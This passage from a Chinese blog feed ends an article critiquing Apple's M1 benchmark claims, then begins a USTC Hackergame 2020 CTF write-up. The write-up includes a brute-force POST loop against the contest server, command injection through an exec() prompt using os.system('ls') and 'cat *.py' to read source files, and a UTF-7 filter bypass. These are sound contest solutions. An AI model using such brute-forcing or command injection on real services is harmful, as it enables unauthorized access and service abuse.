倍，而这一性能提升是和 i7-8557U 对比出来的，上市于 Q3’19、Coffee Lake、14nm++、基础频率 1.7GHz、搭载 Iris Plus 645 核显、TDP 15W。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/10.png\" alt=\"10\" width=\"1002\" height=\"544\" class=\"lazy post-img\"></p>\n<p>注意到没有，苹果在发布会上对比性能提升时，一直都使用的「best in class」（同类别）、「We have ever created」（我们制造过的）、「better than previous generation」（比上一代更好）的说辞。而当我们真正去注意苹果官网产品页面的脚注，才会发现苹果对比的产品并不是加强了 ML 的 Tiger Lake、并不是 Xe 核显或是 VEGA 显卡，而是 CoffeeLake 的降压 U 和孱弱的 Ice Lake、以及臭名昭著的 UHD 630、和上一代的 Iris Plus。</p>\n<p>而且，让我们再做一道数学题，如果 M1 比 i7-8557U（MBP 13’ 2019）快 2.8 倍、又比 Ice Lake（MBA 2020）快 3.5 倍，那么是不是可以说 i7-8557U 比 Ice Lake 的 i7-1067NG7 快 25% 呢？可以看出，苹果对比的显然是限制功耗和锁频后的性能，因此结论也就很明显了：ARM 凭借着高能耗比、低功耗，在轻薄本上大杀四方，吊打前款，但是绝对性能在普通 PC、笔记本上搭载的 Ice Lake 和 Tiger Lake 面前其实毫无优势、更不可能和 AMD 同台竞技。</p>\n<p>另外，M1 芯片为了追求超小体积和超低功耗，只在 SoC 中封装了两个 LPDDR4X 作为内存，因此只能提供最高 16G 的「DRAM」内存，这对上网本和办公白领来说绰绰有余，对「创作者」、「开发者」来说自然是远远不够的；被阉割的还有 Mac Mini 上的雷电接口，搭载 Intel 的 Mac Mini 有两个雷电控制器、而搭载 M1 的只有 SoC 里集成的一个，因此 ARM Mac Mini 只有两个雷电接口、而不是四个。</p>\n<p>综合来说，M1 的超低功耗、超高能耗比在轻薄本、上网本上绝对是不二选择，MBA 这样的目标用户更在乎发热和续航，而 M1 恰恰可以满足他们的需要；M1 所不能做的事情，如绝对性能不足、无法连接 eGPU、恰恰是上网本用户所不在意的。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/6.jpg\" alt=\"6\" width=\"1280\" height=\"718\" class=\"lazy post-img\"></p>\n<p>但是，苹果在没有电池的 Mac Mini、和在「面向创作者和开发者」的 MacBook Pro 13’ 上搭载孱弱的 M1，实在有点不可理喻、和一种自降身段的感觉。毕竟，Mac Mini 是时时刻刻需要插着电源的，而 MacBook Pro 13’ 的用户也不会抱着笔记本在户外使用 Xcode、Final Cut Pro X 和 Logic Pro，对吧？</p>\n<p>虽然我们现在看到 KOL、小编们普遍对 M1 称赞不已，但是可以预见当他们发现这次发布的三款 Mac 都没法安装 Windows、都暂时无法运行 Photoshop 后，对 ARM Mac 的评价也会逐渐转变风向的。</p>\n<h2>Apple ARM 芯片和 ARM Mac 的未来？</h2>\n<p>综合来说，我们在 M1 上看到了令人惊艳的超低功耗加超高能耗比；而在性能方面，对于一款 ARM 架构的处理器来说，「勉勉强强」能和 Tiger Lake「五五开」也已经是不小的成就了。在上网本、轻薄本级别的 MacBook Air 乃至日后可能重启的 MacBook 12’ Refresh 产品线上，M 系列处理器肯定是不二选择。</p>\n<p>与之对应的是「生产力 Mac」。MacBook Pro、iMac 的目标用户从事的工作大多为移动办公（MBP Only）、绘图、图像处理、音视频创作、影视制作、软件开发、轻度机器学习，而 Mac Pro、iMac Pro 的目标用户则大多从事大型影视剪辑、大型图像处理、大型数字音频制作、三维制作、大型机器学习等工作。而正如我在之前章节所说，让这类行业内的软件优化适配、使其能够发挥 ARM 的硬件的完整性能，还有非常漫长的一段路要走。而在这些行业中，自行组装 PC 固然可以弥补硬件性能上的差距、而在软件生态上 macOS 却是无出其右的，看看 Logic Pro、Final Cut Pro X 就知道了。苹果在未来很长一段时间内都会继续发布搭载 Intel 的 Mac。如果苹果一意孤行，急迫地在这类产品线强上 M 系列处理器，只会迫使这类目标用户转向 Windows 10 和 AMD 的怀抱。</p>\n<p>历史上，苹果的架构选择甚至还会受到苹果公司领导层决策的影响。1992 年苹果就在计划将 Macintosh System（Classic Mac OS）迁移到 X86 架构上，甚至开展了一项秘密计划「Star Trek」。而当更青睐 PowerPC 的苹果新任 CEO 走马上任以后，X86 架构迁移计划就被束之高阁，直到乔布斯重新回到苹果、WWDC 2005 宣布 Mac 将迁移到 Intel 处理器上。因此，也不排除存在这种可能：随着库克离任、苹果领导层变动、ARM 处理器不再向「高性能、密集计算」的方向突破，甚至可能苹果换了 CEO 后 Mac 将会搭载 AMD 处理器，但是这两种可能性显然不大。</p>\n<h2>黑苹果的未来？</h2>\n<p>作为一名黑苹果用户，M1 处理器的发布自然会引起对黑苹果未来的关注。正如我在「<a href=\"https://blog.skk.moe/post/history-osx86/#%E8%8B%B9%E6%9E%9C%E4%BB%80%E4%B9%88%E6%97%B6%E5%80%99%E4%BC%9A%E6%94%BE%E5%BC%83-Intel-%E7%9A%84-x86-%E6%9E%B6%E6%9E%84%EF%BC%9F\">黑苹果的未来</a>」一文中的「苹果什么时候会放弃 Intel 的 x86 架构？」章节中所说，过去 6 年之间每个 macOS 大版本都会兼容至少 7 年以前发布的设备。苹果的副总裁 John Ternus 在 Apple Events 中所说「This journey will take a couple of years to complete, and we have a long way to go」，预示着苹果在未来数年内都会继续发布搭载 Intel 处理器的 Mac。</p>\n<div class=\"license\"> <div class=\"license-title\">谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/talk-about-arm-m1-mac/\">https://blog.skk.moe/post/talk-about-arm-m1-mac/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-11-11</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/talk-about-arm-m1-mac/"},{"title":"USTC Hackergame 2020（中科大信安赛）write up","date":"2020-11-06 22:00:00","description":"\n<p>作为一只 CS 零基础、信安零基础、CTF 零基础的菜狐狐，苏卡卡今年又来参加 USTC Hackergame 啦！由于一边做题一边总结思路（指写 Write Up），所以苏卡卡应该是第一个发布非官方的 USTC Hackergame 2020 Write Up 的吧（嘿嘿）。</p>\n<blockquote><p>题图来自 USTC Hackergame 2019「Happy LUG」</p></blockquote>\n<span></span><h2>签到题</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/1.png\" width=\"508\" height=\"417\" class=\"lazy post-img\"></p>\n<p>只要提取 1 个 flag 就好啦！可是，为什么这个反人类的 <code>form-control</code> 的步长竟然是 0.00001：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/2.png\" width=\"794\" height=\"327\" class=\"lazy post-img\"></p>\n<p>继续看下去会发现，用手是根本不可能拖到 1.00000 的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/25.png\" width=\"636\" height=\"277\" class=\"lazy post-img\"></p>\n<p>不管了，直接点击「提取」：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/3.png\" width=\"482\" height=\"393\" class=\"lazy post-img\"></p>\n<p>同时，发现地址栏里的 URL 变成了 <code>http://202.38.93.111:10000/?number=0.84608</code>。那就立刻访问 <code>http://202.38.93.111:10000/?number=1</code> 拿到 flag！</p>\n<blockquote><p>Google 从 Chrome 76 起开始推行 WHATWG URL 规范中的「<a href=\"https://url.spec.whatwg.org/#url-rendering-simplification\">Simplify non-human-readable or irrelevant components</a>」、即「简化非人类可读或不相关的组件」。不过 Chrome 85 起提供了「Always Show Full URLs」的选项，可以在地址栏上右键后从菜单中开启。</p></blockquote>\n<h2>猫咪问答++</h2>\n<blockquote><ol>\n<li>以下编程语言、软件或组织对应标志是哺乳动物的有几个？<br>Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce.<br>提示：学术上一般认为龙不属于哺乳动物。</li>\n<li>第一个以信鸽为载体的 IP 网络标准的 RFC 文档中推荐使用的 MTU (Maximum Transmission Unit) 是多少毫克？<br>提示：咕咕咕，咕咕咕。</li>\n<li>USTC Linux 用户协会在 2019 年 9 月 21 日自由软件日活动中介绍的开源游戏的名称共有几个字母？<br>提示：活动记录会在哪里？</li>\n<li>中国科学技术大学西校区图书馆正前方（西南方向） 50 米 L 型灌木处共有几个连通的划线停车位？<br>提示：建议身临其境。</li>\n<li>中国科学技术大学第六届信息安全大赛所有人合计提交了多少次 flag？<br>提示：是一个非负整数。</li>\n</ol></blockquote>\n<p>其中，第二题、第三题、第五题的答案分别可以在下述 URL 中找到：</p>\n<ul>\n<li>\n<a href=\"https://tools.ietf.org/html/rfc1149\">RFC1149 - A Standard for the Transmission of IP Datagrams on Avian Carriers</a>：信鸽的典型 MTU 是 256 毫克</li>\n<li>\n<a href=\"https://news.ustclug.org/2019/09/2019-sfd-ustc/\">2019 软件自由日中国科大站 - USTC LUG</a>：开源游戏的名称是 Teeworlds、有 9 个字母</li>\n<li><a href=\"https://news.ustclug.org/2019/12/hackergame-2019/\">中国科学技术大学第六届信息安全大赛圆满结束 - USTC LUG</a></li>\n</ul>\n<p>至于第一题要搜索二十几种吉祥物、一不小心还会数错，第四题要去找卫星图像或者街景图，大尾巴狐狸太懒了、不想搜索了！有没有别的方法获取 flag？</p>\n<p>第一题给了 23 种编程语言、软件或组织：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-string\">\"Docker，Golang，Python，Plan 9，PHP，GNU，LLVM，Swift，Perl，GitHub，TortoiseSVN，FireFox，MySQL，PostgreSQL，MariaDB，Linux，OpenBSD，FreeDOS，Apache Tomcat，Squid，openSUSE，Kali，Xfce\"</span>.split(<span class=\"hljs-string\">'，'</span>).length<span class=\"hljs-comment\">// 23</span></code></pre>\n<p>至于图书馆前的地上停车位、总不可能超过 100 个吧？</p>\n<p>那么，写一个遍历跑第一题和第四题的答案，总会跑出 Flag 的！</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">1</span>; i &lt; <span class=\"hljs-number\">23</span>; i++) { <span class=\"hljs-comment\">// 至少有 1 种哺乳动物；既然提示了龙不是哺乳动物，那么肯定不会 23 种前部都是</span>  <span class=\"hljs-keyword\">for</span> (<span class=\"hljs-keyword\">let</span> j = <span class=\"hljs-number\">0</span>; j &lt; <span class=\"hljs-number\">100</span>; j++) { <span class=\"hljs-comment\">// 一个停车位都没有的可能性不是没有，遍历时要考虑进去</span>    <span class=\"hljs-keyword\">const</span> formData = <span class=\"hljs-keyword\">new</span> FormData();    formData.append(<span class=\"hljs-string\">'q1'</span>, i);    formData.append(<span class=\"hljs-string\">'q2'</span>, <span class=\"hljs-number\">256</span>);    formData.append(<span class=\"hljs-string\">'q3'</span>, <span class=\"hljs-number\">9</span>);    formData.append(<span class=\"hljs-string\">'q4'</span>, j);    formData.append(<span class=\"hljs-string\">'q4'</span>, <span class=\"hljs-number\">17098</span>);    fetch(<span class=\"hljs-string\">'http://202.38.93.111:10001/'</span>, {      <span class=\"hljs-attr\">body</span>: formData,      <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'POST'</span>,    }).then(<span class=\"hljs-function\"><span class=\"hljs-params\">resp</span> =&gt;</span> resp.text()).then(<span class=\"hljs-function\"><span class=\"hljs-params\">text</span> =&gt;</span> {      <span class=\"hljs-keyword\">if</span> (!text.includes(<span class=\"hljs-string\">'没有全部答对，不能给你 flag'</span>)) {        <span class=\"hljs-built_in\">console</span>.log(i, j, text);      }    });  }}</code></pre>\n<p>果然，<del>通过对比赛平台的 CC 攻击</del>，很快就把第一题和第四题答案跑出来了：第一题的答案是 12、第四题的答案是 9。输入正确答案提交即可获取 flag。</p>\n<h2>2048</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/4.png\" width=\"680\" height=\"888\" class=\"lazy post-img\"></p>\n<p>毫无疑问，这道题如果真的玩到 2048 获取 Flag 是肯定可行的，但是我懒；同样的原因，我也不想对这个网站里每个 JS 都审计一次。既然如此，不如先随便玩玩，看看这道题的 Flag 大概会藏在哪里。</p>\n<p>随便乱敲方向键刻意使 Game Over，DevTools 截获了一个 HTTP 请求、是 <code>html_actuator.js</code> 第 164 行发起的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/5.png\" width=\"1862\" height=\"712\" class=\"lazy post-img\"></p>\n<p>现在我们直接审计 <code>html_actuator.js</code> 就好了，把发起 AJAX 请求的函数找出来：</p>\n<pre><code class=\"hljs js\">HTMLActuator.prototype.message = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">won</span>) </span>{  <span class=\"hljs-keyword\">var</span> type    = won ? <span class=\"hljs-string\">\"game-won\"</span> : <span class=\"hljs-string\">\"game-over\"</span>;  <span class=\"hljs-keyword\">var</span> message = won ? <span class=\"hljs-string\">\"FLXG 大成功！\"</span> : <span class=\"hljs-string\">\"FLXG 永不放弃！\"</span>;  <span class=\"hljs-keyword\">var</span> url;  <span class=\"hljs-keyword\">if</span> (won) {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span> + (<span class=\"hljs-string\">'b'</span>+<span class=\"hljs-string\">'a'</span>+ +<span class=\"hljs-string\">'a'</span>+<span class=\"hljs-string\">'a'</span>).toLowerCase();  } <span class=\"hljs-keyword\">else</span> {    url = <span class=\"hljs-string\">\"/getflxg?my_favorite_fruit=\"</span>;  }  <span class=\"hljs-keyword\">let</span> request = <span class=\"hljs-keyword\">new</span> XMLHttpRequest();  request.open(<span class=\"hljs-string\">'GET'</span>, url);  request.responseType = <span class=\"hljs-string\">'text'</span>;  request.onload = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>) </span>{    <span class=\"hljs-built_in\">document</span>.getElementById(<span class=\"hljs-string\">\"game-message-extra\"</span>).innerHTML = request.response;  };  request.send();  <span class=\"hljs-built_in\">this</span>.messageContainer.classList.add(type);  <span class=\"hljs-built_in\">this</span>.messageContainer.getElementsByTagName(<span class=\"hljs-string\">\"p\"</span>)[<span class=\"hljs-number\">0</span>].textContent = message;  <span class=\"hljs-built_in\">this</span>.clearContainer(<span class=\"hljs-built_in\">this</span>.sharingContainer);  <span class=\"hljs-built_in\">this</span>.sharingContainer.appendChild(<span class=\"hljs-built_in\">this</span>.scoreTweetButton());};</code></pre>\n<p>看了代码就知道怎么获取 Flag 了，直接 GET <code>/getflxg?my_favorite_fruit=banana</code> 即可。</p>\n<blockquote><p>小彩蛋，在 JavaScript 中字符串类型 <code>String</code> 转换成数字类型 <code>Number</code> 时会得到 <code>NaN</code>，凑成了 <code>banana</code>。</p></blockquote>\n<h2>一闪而过的 Flag</h2>\n<blockquote>\n<p>…… <strong>程序每次运行时隐约可见黑色控制台上有 flag 一闪而过。</strong></p>\n<p>……</p>\n<p>而你作为一名新生，不由动了恻隐之心。望着诗人潇洒远去的背影，你可以赶在下午诗人回来之前，帮助这位可怜的人，用 flag 装满他的饭盒吗?</p>\n<p><a href=\"https://archive.org/details/untitled-01_exe\">打开/下载题目</a> （Hosted at Internet Archive）</p>\n</blockquote>\n<p>欺负苏卡卡用 macOS 不用 Windows，哼！苏卡卡才不会重启到 Windows 就为了看个 flag 呢，Parallels Desktop 启动！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/21.png\" width=\"1423\" height=\"781\" class=\"lazy post-img\"></p>\n<p>没有什么是截图解决不了的。。。啊，什么？还要区分 <code>i I 1 l</code>？<del>当然是猜 flag 啦</del></p>\n<p>小 Tip，打开 CMD、左上角图标右键、「默认值」，是可以设置「控制台窗口」默认字体和字号的：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/22.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/23.png\" width=\"800\" height=\"440\" class=\"lazy post-img\"></p>\n<p>改了字体以后，这不就分得清清楚楚啦！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.4/24.png\" width=\"1067\" height=\"586\" class=\"lazy post-img\"></p>\n<h2>从零开始的记账工具人</h2>\n<blockquote>\n<p>如同往常一样，你的 npy 突然丢给你一个购物账单：“我今天买了几个小玩意，你能帮我算一下一共花了多少钱吗？”</p>\n<p>你心想：<del>又双叒叕要开始吃土了</del> 这不是很简单吗？电子表格里面一拖动就算出来了</p>\n<p>只不过拿到账单之后你才注意到，似乎是为了剁手时更加的安心，这次的账单上面的金额全使用了中文大写数字</p>\n<p><strong>注意：请将账单总金额保留小数点后两位，放在 <code>flag{}</code> 中提交，例如总金额为 123.45 元时，你需要提交 <code>flag{123.45}</code></strong></p>\n</blockquote>\n<p>这道题上来继续欺负苏卡卡没有在 macOS 上安装 Office，<del>大尾巴狐狸非常生气</del>。你看 npm 上这个能解析 <code>xlsx</code> 文件的 SheetJS、大写数字转小写的 nzh 还蛮好用的。Node.js 代码如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> XLSX = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'xlsx'</span>); <span class=\"hljs-comment\">// 解析 xlsx 用</span><span class=\"hljs-keyword\">const</span> NzhCN = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'nzh/cn'</span>); <span class=\"hljs-comment\">// 大写数字转小写</span><span class=\"hljs-keyword\">const</span> xlsx = XLSX.readFile(<span class=\"hljs-string\">'./bills.xlsx'</span>); <span class=\"hljs-comment\">// 当然你要先把 xlsx 文件下载下来</span><span class=\"hljs-keyword\">const</span> data = XLSX.utils.sheet_to_json(xlsx.Sheets[xlsx.SheetNames[<span class=\"hljs-number\">0</span>]]);<span class=\"hljs-keyword\">let</span> count = <span class=\"hljs-number\">0</span>;data.forEach(<span class=\"hljs-function\"><span class=\"hljs-params\">row</span> =&gt;</span> {  <span class=\"hljs-keyword\">const</span> moneyData = { <span class=\"hljs-attr\">yuan</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">jiao</span>: <span class=\"hljs-number\">0</span>, <span class=\"hljs-attr\">fen</span>: <span class=\"hljs-number\">0</span> };  <span class=\"hljs-comment\">// nzh 不支持处理金额，需要自己实现一个</span>  <span class=\"hljs-keyword\">let</span> tmp;  [[<span class=\"hljs-string\">'元'</span>, <span class=\"hljs-string\">'yuan'</span>], [<span class=\"hljs-string\">'角'</span>, <span class=\"hljs-string\">'jiao'</span>], [<span class=\"hljs-string\">'分'</span>, <span class=\"hljs-string\">'fen'</span>]].forEach(<span class=\"hljs-function\">(<span class=\"hljs-params\">[i, dataKey]</span>) =&gt;</span> {    tmp = (tmp || row[<span class=\"hljs-string\">'单价'</span>]).split(i);    <span class=\"hljs-keyword\">if</span> (tmp.length === <span class=\"hljs-number\">1</span>) {      tmp = tmp[<span class=\"hljs-number\">0</span>]    } <span class=\"hljs-keyword\">else</span> {      moneyData[dataKey] = NzhCN.decodeB(tmp[<span class=\"hljs-number\">0</span>]);      tmp = tmp[<span class=\"hljs-number\">1</span>]    }  });  <span class=\"hljs-comment\">// 处理金额时，要小心浮点数大坑哟</span>  <span class=\"hljs-keyword\">const</span> value = moneyData.yuan * <span class=\"hljs-number\">100</span> + moneyData.jiao * <span class=\"hljs-number\">10</span> + moneyData.fen;  count = count + value * row[<span class=\"hljs-string\">'数量'</span>];});<span class=\"hljs-built_in\">console</span>.log(<span class=\"hljs-string\">`flag{<span class=\"hljs-subst\">${(count<span class=\"hljs-regexp\">/100).toFixed(2)}}`); /</span><span class=\"hljs-regexp\">/ 直接打印 flag</span></span></span></code></pre>\n<h2>超简单的世界模拟器</h2>\n<blockquote>\n<p>……</p>\n<p>你的任务是在生命游戏的世界中，复现出蝴蝶扇动翅膀，引起大洋彼岸风暴的效应。</p>\n<p>通过改变左上角 15x15 的区域，在游戏演化 200 代之后，如果被特殊标注的正方形内的细胞被“清除”，你将会得到对应的 flag：</p>\n<p>“清除”任意一个正方形，你将会得到第一个 flag。同时“清除”两个正方形，你将会得到第二个 flag。</p>\n</blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.5/26.png\" width=\"919\" height=\"936\" class=\"lazy post-img\"></p>\n<p>在 Google 上搜索「生命游戏」，找到了一个知乎提问和 <a href=\"https://www.conwaylife.com/wiki/Main_Page\">Conway Life Game Wiki</a>。大概了解康威生命游戏是什么后就理解了题目的要求：要在 15x15 的范围内构建一个生命游戏图形、在演化到 200 代之后会清除两个种群。</p>\n<p>第一个 Payload 是一艘最简单的会向右平移「飞船」（这个图形在知乎或是 Life Game Wiki 上都可以被轻易找到），可以直接摧毁第一个种群：</p>\n<pre><code class=\"hljs plaintext\">00000110111101101100011</code></pre>\n<p>第二个 Payload 是我一不小心试出来的，由一个平移的「飞船」和一个沿着斜对角线行走的「滑翔者」共同组成，他们会「擦弹」引发「大爆炸」，在 80 代左右摧毁第一个种群、在 160 代左右摧毁第二个种群：</p>\n<pre><code class=\"hljs plaintext\">0000011011110110110001100001101011</code></pre>\n<h2>从零开始的火星文生活</h2>\n<blockquote>\n<p>……</p>\n<p>L 同学打开附件一看，傻眼了，全都是意义不明的汉字。机智的 L 同学想到 Q 同学平时喜欢使用 <strong>GBK 编码</strong>，也许是打开方式不对。结果用 GBK 打开却看到了一堆夹杂着日语和数字的<strong>火星文</strong>……</p>\n<p>L 同学彻底懵逼了，几经周折，TA 找到了科大最负盛名的火星文专家 (你)。依靠多年的字符编码解码的经验，你可以破译 Q 同学发来的火星文是什么意思吗？</p>\n<p>注：正确的 flag 全部由 <strong>ASCII</strong> 字符组成！</p>\n</blockquote>\n<p>这种 GBK、UTF-8 之间的火星文编码问题，直接给一个 Unix 下的 <strong>万能解法</strong>：</p>\n<pre><code class=\"hljs bash\">cat gibberish_message.txt | iconv -f utf8 -t gbk | iconv -f utf8 -t latin1 | iconv -f gbk -t utf8</code></pre>\n<p>剩下要做的，就是把全角转换成半角了。</p>\n<h2>自复读的复读机</h2>\n<blockquote>\n<p>能够复读其他程序输出的程序只是普通的复读机。</p>\n<p>顶尖的复读机还应该能复读出自己的源代码。</p>\n<p>什么是国际复读机啊（战术后仰）</p>\n<p>你现在需要编写两个只有一行 Python 代码的顶尖复读机：</p>\n<ul>\n<li>其中一个要输出代码本身的逆序（即所有字符从后向前依次输出）</li>\n<li>另一个是输出代码本身的 sha256 哈希值，十六进制小写</li>\n</ul>\n<p>满足两个条件分别对应了两个 flag。</p>\n<p>快来开始你的复读吧~</p>\n</blockquote>\n<p>访问题目，输出的提示信息是：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec():</code></pre>\n<p>什么，可以 <code>exec()</code> 啊？那大尾巴狐狸直接干坏事了：</p>\n<pre><code class=\"hljs plaintext\">Your one line python code to exec(): import os; os.system(\"ls\")</code></pre>\n<p>发现目录下面有一个 <code>checker.py</code> 和一个 <code>runner.py</code>。接着用 <code>os.system(\"cat *.py\")</code> 获得题目源码：</p>\n<pre><code class=\"hljs python\"><span class=\"hljs-comment\"># checker.py</span><span class=\"hljs-keyword\">import</span> subprocess<span class=\"hljs-keyword\">import</span> hashlib<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">\"__main__\"</span>:    code = <span class=\"hljs-built_in\">input</span>(<span class=\"hljs-string\">\"Your one line python code to exec(): \"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-keyword\">if</span> <span class=\"hljs-keyword\">not</span> code:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Code must not be empty\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    p = subprocess.run(        [<span class=\"hljs-string\">\"su\"</span>, <span class=\"hljs-string\">\"nobody\"</span>, <span class=\"hljs-string\">\"-s\"</span>, <span class=\"hljs-string\">\"/bin/bash\"</span>, <span class=\"hljs-string\">\"-c\"</span>, <span class=\"hljs-string\">\"/usr/local/bin/python3 /runner.py\"</span>],        <span class=\"hljs-built_in\">input</span>=code.encode(),        stdout=subprocess.PIPE,    )    <span class=\"hljs-keyword\">if</span> p.returncode != <span class=\"hljs-number\">0</span>:        <span class=\"hljs-built_in\">print</span>()        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code did not run successfully\"</span>)        exit(-<span class=\"hljs-number\">1</span>)    output = p.stdout.decode()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(code))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Output of your code is:\"</span>)    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">repr</span>(output))    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking reversed(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> code[::-<span class=\"hljs-number\">1</span>] == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag1\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)    <span class=\"hljs-built_in\">print</span>()    <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Checking sha256(code) == output\"</span>)    <span class=\"hljs-keyword\">if</span> hashlib.sha256(code.encode()).hexdigest() == output:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">open</span>(<span class=\"hljs-string\">\"/root/flag2\"</span>).read())    <span class=\"hljs-keyword\">else</span>:        <span class=\"hljs-built_in\">print</span>(<span class=\"hljs-string\">\"Failed!\"</span>)<span class=\"hljs-comment\"># runner.py</span><span class=\"hljs-built_in\">exec</span>(<span class=\"hljs-built_in\">input</span>())</code></pre>\n<blockquote><p>不要想着直接 <code>exec()</code> 偷 flag 了，你以为这比赛是 ylb 搞的啊？</p></blockquote>\n<p>可以看到「反向复读」的检查中使用了 <code>[::-1]</code> 倒序，所以在构造反向复读的语句中也应该使用 <code>[::-1]</code>。</p>\n<p>首先是构建正向复读的语句，在 Google 中 <del>盲目</del> 搜索的过程中确定了关键词「Quine Python」、找到了 <a href=\"https://www.geeksforgeeks.org/quine-in-python/\">这个网站</a>，介绍了如下语句：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">'_=%r;print (_%%_)'</span>;<span class=\"hljs-built_in\">print</span> (_%_)</code></pre>\n<p>那个网站也给出了这个语句的详细解释，不过简单来说，我们利用了 <code>print</code> 字符格式化、通过 <code>%r</code>（当然也可以用 <code>%s</code>）获得 <code>_</code> 变量的取值；而在 <code>_</code> 变量中使用了 <code>%%</code> 防止 <code>%</code> 被转义。</p>\n<p>既然有了正向复读，稍加改动即可得到反向复读。首先在 <code>print(_&amp;_)</code> 中加上 <code>[::-1]</code> 获得倒叙，同时也要对应修改 <code>_</code> 变量：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>])</code></pre>\n<p>信心满满地去提交，结果 Check Failed，发现 <code>print</code> 在结尾带上了换行符。所以再为 <code>print</code>再加上 <code>end=\"\"</code> 即可：</p>\n<pre><code class=\"hljs python\">_=<span class=\"hljs-string\">')\"\"=dne,]1-::[_%%_(tnirp;%r=_'</span>;<span class=\"hljs-built_in\">print</span>(_%_[::-<span class=\"hljs-number\">1</span>],end=<span class=\"hljs-string\">\"\"</span>)</code></pre>\n<p>成功获得第一个 flag。</p>\n<h2>233 同学的字符串工具</h2>\n<blockquote>\n<p>233 同学最近刚刚学会了 Python 的字符串操作，于是写了两个小程序运行在自己的服务器上。这个工具提供两个功能：</p>\n<ul>\n<li>字符串大写工具</li>\n<li>UTF-7 到 UTF-8 转换工具</li>\n</ul>\n<p>除了点击下方的打开题目按钮使用网页终端，你也可以通过 <code>nc 202.38.93.111 10233</code> 命令连接到 233 同学的服务上。你可以在这里看到 233 同学的源代码: <a href=\"https://gist.github.com/SukkaW/80d5c5d30786a758fe1f014d6a48b799#file-string_tool-py\">string_tool.py</a>。</p>\n</blockquote>\n<p>这一道题我先拿到了第二个 flag 后才拿到了第一个 flag。首先在 <code>www.string-function.com</code> 这个网站上找到了 UTF-7 和 ASCII 编码互换表： <a href=\"http://string-functions.com/encodingtable.aspx?encoding=65000&amp;decoding=20127\">UTF-7 =&gt; ASCII</a> <a href=\"http://string-functions.com/encodingtable.aspx?encoding=20127&amp;decoding=65000\">ASCII =&gt; UTF-7</a>，照着表（加上一些简单的推算）将 <code>flag</code> 编码成 <code>+AGYAbABhAGc-</code>、成功拿到第二个 flag。</p>\n<p>获得第二个 flag 以后，决定根据相同的思路去查 Unicode sheet，但是直到后来经过提醒才想起来有「<a href=\"https://en.wikipedia.org/wiki/Orthographic_ligature\">合字</a>」这种神奇的存在，最终利用 <a 